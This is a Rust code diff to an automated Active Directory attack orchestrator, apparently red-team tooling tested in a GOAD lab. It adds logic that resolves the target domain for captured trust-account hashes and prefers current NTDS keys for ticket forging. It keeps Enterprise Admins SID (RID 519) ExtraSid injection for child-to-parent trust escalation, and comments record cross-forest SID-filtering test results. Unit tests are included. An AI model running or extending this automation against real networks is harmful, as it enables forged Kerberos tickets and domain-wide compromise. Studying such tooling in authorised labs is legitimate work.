@@ -205,6 +205,73 @@ fn trust_enum_dedup_key(domain: &str, is_hash_retry: bool) -> String {
     }
 }
 
+/// Find a target FQDN for a captured trust account (`<LABEL>$`) when the
+/// target domain has not been formally enumerated as a DC.
+///
+/// Resolution accepts a candidate FQDN only when:
+///   1. Its first DNS label (uppercased) equals `netbios_upper`.
+///   2. Its FQDN appears in at least one existing state record — a Host
+///      hostname suffix, a Credential domain, or a discovered-vuln
+///      `details["domain"]`.
+///
+/// (1) is the label guard; (2) is the corroborated-signal guard. Together
+/// they ensure a captured trust key only fires against a target the
+/// orchestrator has independent evidence for — no blind NetBIOS-to-TLD
+/// inference.
+fn resolve_target_fqdn_from_signals(
+    state: &StateInner,
+    netbios_upper: &str,
+    source_lower: &str,
+) -> Option<String> {
+    let label_matches = |fqdn: &str| -> bool {
+        let lower = fqdn.to_lowercase();
+        if lower == source_lower || !lower.contains('.') {
+            return false;
+        }
+        fqdn.split('.')
+            .next()
+            .map(|label| label.to_uppercase() == netbios_upper)
+            .unwrap_or(false)
+    };
+
+    // Hosts: hostname like "dc01.contoso.local" → suffix "contoso.local".
+    let from_hosts = state.hosts.iter().filter_map(|h| {
+        let hostname = h.hostname.trim();
+        if hostname.is_empty() {
+            return None;
+        }
+        let (_, suffix) = hostname.split_once('.')?;
+        if !suffix.contains('.') {
+            return None;
+        }
+        Some(suffix.to_string())
+    });
+
+    // Credentials: explicit `.domain` field already FQDN-ish.
+    let from_creds = state.credentials.iter().filter_map(|c| {
+        let d = c.domain.trim();
+        if d.is_empty() || !d.contains('.') {
+            None
+        } else {
+            Some(d.to_string())
+        }
+    });
+
+    // Vulns: `details["domain"]` carried by discovered vulns.
+    let from_vulns = state.discovered_vulnerabilities.values().filter_map(|v| {
+        v.details
+            .get("domain")
+            .and_then(|x| x.as_str())
+            .map(|s| s.trim().to_string())
+            .filter(|s| !s.is_empty() && s.contains('.'))
+    });
+
+    from_hosts
+        .chain(from_creds)
+        .chain(from_vulns)
+        .find(|fqdn| label_matches(fqdn))
+}
+
 /// Monitors for trust account hashes and dispatches cross-domain attacks.
 /// Interval: 30s.
 pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
@@ -1247,9 +1314,18 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     .map(|t| (t.flat_name.to_uppercase(), t))
                     .collect();
 
-            let items = state
-                .hashes
-                .iter()
+            // Iterate current keys before history keys. NTDS exposes both
+            // current and `_history0`/`_prev` rows for trust accounts; the
+            // dedup key `(source, username)` collapses them, so whichever
+            // wins the dedup race gets the dispatch. Sorting current-first
+            // ensures we forge with the up-to-date trust key by default and
+            // only fall back to a history key if the current one's dedup
+            // already cleared (operator retry path).
+            let mut hashes_sorted: Vec<&ares_core::models::Hash> = state.hashes.iter().collect();
+            hashes_sorted.sort_by_key(|h| h.is_previous as u8);
+
+            let items = hashes_sorted
+                .into_iter()
                 .filter_map(|hash| {
                     if !hash.username.ends_with('$') {
                         return None;
@@ -1274,26 +1350,37 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     }
                     let source_lower = source_domain.to_lowercase();
 
-                    // Resolve target FQDN: prefer explicit TrustInfo from LDAP
-                    // enumeration, else derive from known domains where the
-                    // NetBIOS label matches and the FQDN is not the source
-                    // (filters out same-domain machine accounts).
+                    // Resolve target FQDN in three tiers:
+                    //   1. Explicit TrustInfo from prior LDAP trust enum.
+                    //   2. Known-FQDN tier — `domain_controllers` /
+                    //      `dominated_domains` where the first DNS label
+                    //      matches. Requires prior DC enum on the target.
+                    //   3. Corroborated-signal tier — candidate FQDN appears
+                    //      in state via a Host hostname suffix, a Credential
+                    //      row, or a discovered-vuln details["domain"], AND
+                    //      its first DNS label matches `netbios`. This lets
+                    //      a captured trust key act on a target whose DC we
+                    //      haven't enumerated yet, without resorting to a
+                    //      blind FQDN guess.
                     let target_domain = if let Some(t) = trust_by_flat.get(&netbios) {
                         t.domain.clone()
+                    } else if let Some(d) = state
+                        .domain_controllers
+                        .keys()
+                        .chain(state.dominated_domains.iter())
+                        .find(|d| {
+                            let dl = d.to_lowercase();
+                            dl != source_lower
+                                && d.split('.')
+                                    .next()
+                                    .map(|label| label.to_uppercase() == netbios)
+                                    .unwrap_or(false)
+                        })
+                        .cloned()
+                    {
+                        d
                     } else {
-                        state
-                            .domain_controllers
-                            .keys()
-                            .chain(state.dominated_domains.iter())
-                            .find(|d| {
-                                let dl = d.to_lowercase();
-                                dl != source_lower
-                                    && d.split('.')
-                                        .next()
-                                        .map(|label| label.to_uppercase() == netbios)
-                                        .unwrap_or(false)
-                            })
-                            .cloned()?
+                        resolve_target_fqdn_from_signals(&state, &netbios, &source_lower)?
                     };
 
                     let dedup_key = format!(
@@ -1610,6 +1697,13 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             let is_child_to_parent =
                 source_l != target_l && source_l.ends_with(&format!(".{target_l}"));
             let is_cross_domain = source_l != target_l;
+            // Manual SSM validation against GOAD-staging proved that injecting
+            // foreign-realm SIDs (RID 519 EA, RID 1117/1118 custom groups, even
+            // a direct user RID 1121 listed in BUILTIN\Administrators) all get
+            // stripped by the receiving DC's SID filter regardless of RID > 1000.
+            // Cross-forest forge with ExtraSid is not load-bearing in this lab.
+            // Keep emission scoped to intra-forest child→parent until we have a
+            // working cross-forest primitive validated end-to-end.
             let needs_target_sid = is_child_to_parent;
             let target_domain_sid: Option<String> =
                 if !needs_target_sid || item.target_domain_sid.is_some() {
@@ -1774,10 +1868,11 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 tool_args["aes_key"] = json!(aes);
             }
             // For child→parent trusts (intra-forest), inject parent's
-            // Enterprise Admins SID (RID 519). SID filtering blocks
-            // ExtraSID across forest trusts, so only emit on intra-forest.
-            // The defer above guarantees target_domain_sid is Some here
-            // when is_child_to_parent.
+            // Enterprise Admins SID (RID 519). Cross-forest extension was
+            // attempted (commit reverted) — manual SSM testing in GOAD-staging
+            // showed every foreign SID (incl. RID > 1000) gets stripped at the
+            // receiving DC. Keep emission scoped to intra-forest until a
+            // working cross-forest primitive is validated end-to-end.
             if is_child_to_parent {
                 if let Some(ref tsid) = target_domain_sid {
                     tool_args["extra_sid"] = json!(format!("{tsid}-519"));
@@ -2583,5 +2678,146 @@ mod tests {
             "contoso.local",
             "fabrikam.local"
         ));
+    }
+
+    // resolve_target_fqdn_from_signals
+
+    #[test]
+    fn resolve_target_fqdn_from_signals_matches_via_host_suffix() {
+        // Trust key `FABRIKAM$` captured on contoso side. fabrikam.local is
+        // not in domain_controllers (no DC enum yet) but a host hostname
+        // suffix in state proves the FQDN is real.
+        let mut s = StateInner::new("op-test".into());
+        s.hosts.push(ares_core::models::Host {
+            ip: "192.168.58.50".into(),
+            hostname: "dc01.fabrikam.local".into(),
+            os: String::new(),
+            roles: Vec::new(),
+            services: Vec::new(),
+            is_dc: false,
+            owned: false,
+        });
+        let got = resolve_target_fqdn_from_signals(&s, "FABRIKAM", "contoso.local");
+        assert_eq!(got.as_deref(), Some("fabrikam.local"));
+    }
+
+    #[test]
+    fn resolve_target_fqdn_from_signals_matches_via_credential_domain() {
+        // Trust key `FABRIKAM$` captured. fabrikam.local appears only as a
+        // Credential domain — enough corroboration to accept.
+        let mut s = StateInner::new("op-test".into());
+        s.credentials.push(ares_core::models::Credential {
+            id: String::new(),
+            username: "alice".into(),
+            password: "P@ssw0rd!".into(),
+            domain: "fabrikam.local".into(),
+            source: String::new(),
+            discovered_at: None,
+            is_admin: false,
+            parent_id: None,
+            attack_step: 0,
+        });
+        let got = resolve_target_fqdn_from_signals(&s, "FABRIKAM", "contoso.local");
+        assert_eq!(got.as_deref(), Some("fabrikam.local"));
+    }
+
+    #[test]
+    fn resolve_target_fqdn_from_signals_matches_via_vuln_domain() {
+        // Trust key `FABRIKAM$` captured. fabrikam.local appears only as a
+        // discovered-vuln details["domain"].
+        let mut s = StateInner::new("op-test".into());
+        let mut details = std::collections::HashMap::new();
+        details.insert(
+            "domain".to_string(),
+            serde_json::Value::String("fabrikam.local".to_string()),
+        );
+        s.discovered_vulnerabilities.insert(
+            "v1".into(),
+            ares_core::models::VulnerabilityInfo {
+                vuln_id: "v1".into(),
+                vuln_type: "smb_signing_disabled".into(),
+                target: "192.168.58.50".into(),
+                discovered_by: String::new(),
+                discovered_at: chrono::Utc::now(),
+                details,
+                recommended_agent: String::new(),
+                priority: 5,
+            },
+        );
+        let got = resolve_target_fqdn_from_signals(&s, "FABRIKAM", "contoso.local");
+        assert_eq!(got.as_deref(), Some("fabrikam.local"));
+    }
+
+    #[test]
+    fn resolve_target_fqdn_from_signals_rejects_when_no_corroborating_record() {
+        // Regression guard against blind guessing. `FABRIKAM$` is in
+        // hand but no Host / Credential / Vuln record references
+        // fabrikam.local. Function MUST return None — the orchestrator
+        // must not forge a ticket against a domain it can't observe.
+        let s = StateInner::new("op-test".into());
+        let got = resolve_target_fqdn_from_signals(&s, "FABRIKAM", "contoso.local");
+        assert!(
+            got.is_none(),
+            "must not infer an FQDN from a NetBIOS label alone"
+        );
+    }
+
+    #[test]
+    fn resolve_target_fqdn_from_signals_rejects_label_mismatch() {
+        // Host record exists for a different domain; the label-match guard
+        // must reject the candidate.
+        let mut s = StateInner::new("op-test".into());
+        s.hosts.push(ares_core::models::Host {
+            ip: "192.168.58.50".into(),
+            hostname: "dc01.contoso.local".into(),
+            os: String::new(),
+            roles: Vec::new(),
+            services: Vec::new(),
+            is_dc: false,
+            owned: false,
+        });
+        let got = resolve_target_fqdn_from_signals(&s, "FABRIKAM", "other.local");
+        assert!(got.is_none());
+    }
+
+    #[test]
+    fn resolve_target_fqdn_from_signals_rejects_source_domain_self_match() {
+        // Even when a Host record matches the source domain's label,
+        // we must skip it — a trust key for `<LABEL>$` is never used to
+        // attack the same domain it lives on.
+        let mut s = StateInner::new("op-test".into());
+        s.hosts.push(ares_core::models::Host {
+            ip: "192.168.58.10".into(),
+            hostname: "dc01.contoso.local".into(),
+            os: String::new(),
+            roles: Vec::new(),
+            services: Vec::new(),
+            is_dc: false,
+            owned: false,
+        });
+        let got = resolve_target_fqdn_from_signals(&s, "CONTOSO", "contoso.local");
+        assert!(got.is_none(), "must not match the source domain");
+    }
+
+    #[test]
+    fn resolve_target_fqdn_from_signals_skips_short_form_credential_domains() {
+        // A Credential with a NetBIOS-form domain ("FABRIKAM") must not
+        // be a corroborating signal — only FQDN-shaped entries qualify.
+        // Without this guard, the function would echo back the very label
+        // we're trying to resolve.
+        let mut s = StateInner::new("op-test".into());
+        s.credentials.push(ares_core::models::Credential {
+            id: String::new(),
+            username: "alice".into(),
+            password: "P@ssw0rd!".into(),
+            domain: "FABRIKAM".into(),
+            source: String::new(),
+            discovered_at: None,
+            is_admin: false,
+            parent_id: None,
+            attack_step: 0,
+        });
+        let got = resolve_target_fqdn_from_signals(&s, "FABRIKAM", "contoso.local");
+        assert!(got.is_none());
     }
 }
